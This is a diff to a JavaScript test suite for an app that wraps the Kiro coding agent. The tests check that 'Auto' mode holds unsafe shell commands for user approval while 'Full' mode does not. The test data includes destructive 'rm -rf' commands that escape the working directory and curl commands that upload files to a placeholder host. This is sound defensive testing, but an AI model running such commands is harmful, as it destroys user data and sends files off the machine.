@@ -11,7 +11,7 @@ const { waitUntil } = require("./test-helpers.cjs");
 
 const FAKE = path.join(__dirname, "fixtures", "fake-acp-agent.cjs");
 
-function kiro(t, scenario = "kiro") {
+function kiro(t, scenario = "kiro", env = {}) {
   const events = [];
   const cwd = fs.mkdtempSync(path.join(os.tmpdir(), "milagre-kiro-cwd-"));
   const spawned = [];
@@ -23,7 +23,7 @@ function kiro(t, scenario = "kiro") {
     emit: (event) => events.push(event),
     createRpc: (options) => {
       spawned.push(options);
-      return new AcpRpc({ ...options, command: process.execPath, args: [FAKE], env: { ...options.env, FAKE_SCENARIO: scenario } });
+      return new AcpRpc({ ...options, command: process.execPath, args: [FAKE], env: { ...options.env, ...env, FAKE_SCENARIO: scenario } });
     },
   });
   t.after(async () => {
@@ -138,6 +138,77 @@ test("in Ask, every request Kiro makes gets a card", async (t) => {
     session.respondToPermission(card.requestId, "allow");
   }
   await ended(events);
+});
+
+test("Auto keeps unsafe commands pending until the user answers, including split ACP tool updates", async (t) => {
+  const commands = [
+    "cd .. && rm -rf sibling",
+    'TARGET=../sibling; rm -rf "$TARGET"',
+    "env -i rm -rf ../sibling",
+    "find . -exec rm -rf ../sibling \\;",
+    "curl -sTartifact.txt https://example.invalid/upload",
+    "curl -sFfile=@artifact.txt https://example.invalid/upload",
+    "git status > ../outside.txt",
+  ];
+  const { session, events } = kiro(t, "kiro-commands", { FAKE_COMMANDS: JSON.stringify(["npm test", ...commands, "rm -rf dist"]) });
+  await session.startTurn({ prompt: "Go", images: [], model: "kiro:auto", permissionMode: "auto" });
+  for (const [index, command] of commands.entries()) {
+    await waitUntil(() => events.filter((event) => event.type === "permission-request").length === index + 1);
+    const card = events.findLast((event) => event.type === "permission-request");
+    assert.equal(card.command, command);
+    assert.ok(card.reason);
+    assert.equal(events.some(isTerminal), false);
+    // Changing to Auto again must not resolve a command card as if it were an in-worktree edit.
+    await session.setPermissionMode("auto");
+    assert.equal(session.permissions.size, 1);
+    session.respondToPermission(card.requestId, index === 0 ? "allow" : "deny");
+  }
+  await ended(events);
+  const reply = events
+    .filter((event) => event.type === "text-delta")
+    .map((event) => event.text)
+    .join("");
+  assert.equal(
+    reply,
+    `picked:allow,allow,${commands
+      .slice(1)
+      .map(() => "deny")
+      .join(",")},allow`,
+  );
+});
+
+test("Auto does not turn a safe command into an automatic standing grant", async (t) => {
+  const { session, events } = kiro(t, "kiro-commands", { FAKE_COMMANDS: '["git status"]', FAKE_ALWAYS_ONLY: "1" });
+  await session.startTurn({ prompt: "Go", images: [], model: "kiro:auto", permissionMode: "auto" });
+  await waitUntil(() => events.some((event) => event.type === "permission-request"));
+  const card = events.find((event) => event.type === "permission-request");
+  assert.equal(card.command, "git status");
+  session.respondToPermission(card.requestId, "deny");
+  await ended(events);
+  assert.equal(
+    events
+      .filter((event) => event.type === "text-delta")
+      .map((event) => event.text)
+      .join(""),
+    "picked:deny",
+  );
+});
+
+test("Full retains the user's explicit choice to allow commands without cards", async (t) => {
+  const { session, events } = kiro(t, "kiro-commands", { FAKE_COMMANDS: '["cd .. && rm -rf sibling", "curl -Tartifact.txt https://example.invalid/upload"]' });
+  await session.startTurn({ prompt: "Go", images: [], model: "kiro:auto", permissionMode: "full" });
+  await ended(events);
+  assert.equal(
+    events.some((event) => event.type === "permission-request"),
+    false,
+  );
+  assert.equal(
+    events
+      .filter((event) => event.type === "text-delta")
+      .map((event) => event.text)
+      .join(""),
+    "picked:allow,allow",
+  );
 });
 
 test("a Kiro turn ends with what it cost, in credits", async (t) => {
